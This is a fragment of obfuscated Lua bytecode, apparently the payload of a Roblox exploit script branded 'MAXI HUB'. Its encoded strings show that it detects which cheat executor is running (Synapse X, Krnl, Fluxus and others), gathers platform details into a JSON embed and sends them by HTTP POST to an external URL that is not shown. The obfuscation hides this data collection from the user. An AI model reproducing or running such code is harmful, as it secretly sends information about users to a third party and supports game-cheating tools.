9FD0BBD0B0D182D184D0BED180D0BCD0B003063Q00662Q6F74657203043Q007465787403083Q004D4158492048554200513Q0002017Q001222000100013Q00202Q00010001000200122Q000300036Q00010003000200122Q000200013Q00202Q00020002000200122Q000400046Q00020004000200122Q000300013Q00202Q00030003000200122Q000500056Q00030005000200202Q00040001000600202Q0005000200074Q00050002000200122Q000600083Q00202Q00060006000900202Q00060006000A00062Q0005001A000100060004463Q001A0001001234000600083Q00202900060006000900202900060006000B0006280005001D000100060004463Q001D000100123E0006000C3Q0006410006001E000100010004463Q001E000100123E0006000D3Q000201000700014Q001100088Q00098Q000A3Q00014Q000B00016Q000C3Q000400302Q000C000F001000302Q000C001100124Q000D00066Q000E3Q000300302Q000E0014001500202Q000F0004001500102Q000E0016000F00302Q000E001700184Q000F3Q000300302Q000F0014001900202Q00100004001900102Q000F0016001000302Q000F001700184Q00103Q000300302Q00100014001A00122Q0011001B3Q00202Q00120004001C4Q00110002000200102Q00100016001100302Q0010001700184Q00113Q000300302Q00110014001D00122Q001200013Q00202Q00120012001E00102Q00110016001200302Q00110017001F4Q00123Q000300302Q0012001400204Q001300076Q00130001000200102Q00120016001300302Q0012001700184Q00133Q000300302Q00130014002100102Q00130016000600302Q0013001700184Q000D00060001001013000C0013000D2Q0024000D3Q0001003025000D00230024001013000C0022000D2Q001B000B00010001001013000A000E000B4Q0008000A00012Q002B3Q00013Q00023Q00053Q00034Q0003063Q00747970656F6603073Q007265717565737403083Q0066756E6374696F6E03053Q007063612Q6C02113Q00063B3Q000400013Q0004463Q000400010026163Q0005000100010004463Q000500012Q002B3Q00013Q001234000200023Q001234000300034Q000300020002000200262A0002000B000100040004463Q000B00012Q002B3Q00013Q001234000200053Q00064200033Q000100022Q001F8Q001F3Q00014Q00330002000200012Q002B3Q00013Q00013Q000A3Q0003073Q00726571756573742Q033Q0055726C03063Q004D6574686F6403043Q00504F535403073Q0048656164657273030C3Q00436F6E74656E742D5479706503103Q00612Q706C69636174696F6E2F6A736F6E03043Q00426F6479030B3Q00482Q747053657276696365030A3Q004A534F4E456E636F6465000F3Q00120E3Q00016Q00013Q00044Q00025Q00102Q00010002000200302Q0001000300044Q00023Q000100302Q00020006000700102Q00010005000200122Q000200093Q00202Q00020002000A4Q000400016Q00020004000200102Q0001000800026Q000200016Q00017Q000B3Q0003053Q007063612Q6C03103Q006964656E746966796578656375746F722Q033Q0073796E03073Q007265717565737403093Q0053796E617073652058030B3Q004B524E4C5F4C4F4144454403043Q004B726E6C030E3Q00666C757875735F636F6E7465787403063Q00466C75787573030F3Q006765746578656375746F726E616D6503073Q00556E6B6E6F776E002A3Q0012343Q00013Q001234000100024Q003D3Q0002000100063B3Q000800013Q0004463Q0008000100063B0001000800013Q0004463Q000800012Q0014000100023Q001234000200033Q00063B0002001100013Q0004463Q00110001001234000200033Q00202900020002000400063B0002001100013Q0004463Q0011000100123E000200054Q0014000200023Q001234000200063Q00063B0002001600013Q0004463Q0016000100123E000200074Q0014000200023Q001234000200083Q00063B0002001B00013Q0004463Q001B000100123E000200094Q0014000200023Q0012340002000A3Q00063B0002002700013Q0004463Q00270001001234000200013Q0012340003000A4Q003D00020002000300063B0002002500013Q0004463Q0025000100061900040026000100030004463Q0026000100123E0004000B4Q0014000400023Q00123E0002000B4Q0014000200024Q002B3Q00017Q00", GetFEnv(), ...);
